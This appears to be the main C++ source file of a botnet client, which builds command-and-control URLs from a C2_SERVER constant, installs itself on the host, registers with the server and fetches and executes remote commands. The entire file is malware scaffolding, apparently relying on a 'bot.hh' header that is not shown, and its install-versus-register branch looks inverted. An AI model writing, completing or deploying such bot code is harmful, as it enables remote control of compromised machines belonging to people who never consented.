#include <stdio.h>
#include <fstream>
#include <string>

#include "bot.hh"

int main() {
    std::string register_url, command_url, install_dir;

    install_dir = util::GetInstallDir();
    Bot host(install_dir);

    register_url = C2_SERVER + REGISTER_URI;
    command_url = C2_SERVER + CMD_URI;

    if (host.IsNew()) {
        host.ExecuteCommand(command_url);
    } else {
        host.Install();
        host.RegisterBot(register_url);
    }

    return 0;
}
